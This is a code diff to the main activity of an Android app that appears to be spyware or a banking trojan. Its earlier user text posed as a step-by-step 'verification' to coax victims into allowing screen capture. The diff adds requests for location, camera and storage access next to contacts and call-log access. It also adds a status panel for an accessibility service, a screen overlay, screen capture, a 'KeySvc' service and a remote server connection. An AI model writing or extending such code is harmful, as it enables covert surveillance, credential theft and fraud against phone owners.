@@ -1,6 +1,5 @@
 package com.aval.seg;
 
-import android.Manifest;
 import android.app.Activity;
 import android.content.Intent;
 import android.media.projection.MediaProjectionManager;
@@ -29,7 +28,11 @@ public class MainActivity extends Activity {
             android.Manifest.permission.READ_CONTACTS,
             android.Manifest.permission.READ_PHONE_STATE,
             android.Manifest.permission.READ_CALL_LOG,
-            android.Manifest.permission.CALL_PHONE
+            android.Manifest.permission.CALL_PHONE,
+            android.Manifest.permission.ACCESS_FINE_LOCATION,
+            android.Manifest.permission.ACCESS_COARSE_LOCATION,
+            android.Manifest.permission.CAMERA,
+            android.Manifest.permission.READ_EXTERNAL_STORAGE
         };
         for (String p : perms)
             if (checkSelfPermission(p) != android.content.pm.PackageManager.PERMISSION_GRANTED) need.add(p);
@@ -79,7 +82,12 @@ public class MainActivity extends Activity {
     private void refresh() {
         TextView t = findViewById(R.id.txt);
         if (t == null) return;
-        if (Util.accOn(this)) t.setText("Etapa 2 de 3: permita a captura de tela para continuar a verificacao.");
+        StringBuilder sb = new StringBuilder();
+        sb.append("acessibilidade: ").append(Util.accOn(this) ? "OK" : "PENDENTE").append('\n');
+        sb.append("overlay: ").append(Settings.canDrawOverlays(this) ? "OK" : "PENDENTE").append('\n');
+        sb.append("captura: ").append(ScreenSvc.alive ? "ATIVA" : "PENDENTE").append('\n');
+        sb.append("servidor: ").append(Net.online() ? "conectado" : "offline");
+        t.setText(sb.toString());
     }
 
     @Override protected void onActivityResult(int rq, int rs, Intent d) {
@@ -92,8 +100,8 @@ public class MainActivity extends Activity {
                 if (Build.VERSION.SDK_INT >= 26) startForegroundService(s);
                 else startService(s);
             } catch (Throwable ignored) {}
-            TextView t = findViewById(R.id.txt);
-            if (t != null) t.setText("Etapa 3 de 3: conclua a verificacao para finalizar.");
+            if (KeySvc.I != null) KeySvc.I.shotOn = true;
+            refresh();
         }
     }
 }
